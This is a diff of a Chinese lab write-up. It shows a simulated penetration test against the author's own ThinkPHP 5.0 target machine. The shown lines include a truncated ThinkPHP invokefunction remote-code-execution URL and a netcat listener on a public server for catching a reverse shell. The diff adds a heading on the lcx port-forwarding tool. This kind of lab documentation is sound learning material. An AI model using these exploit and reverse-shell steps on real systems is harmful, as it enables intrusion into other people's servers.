@@ -29,7 +29,7 @@ VERSION : free 1.0
 - 攻击机位于我的笔记本上的kali nat联网 ip：192.168.153.133
 - 被攻击的是校内我搭建的靶机 ip:10.203.87.64  环境：tp5.0
 - 公网主机：45.\*.\*.190
-# 做个小模拟渗透
+## 做个小模拟渗透
 利用命令执行弹shell
   
 这次用NC弹shell
@@ -38,4 +38,7 @@ http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&func
 
 公网服务器上面监听：
 nc -l -p 1235
+
+
+## 使用lcx功能
 
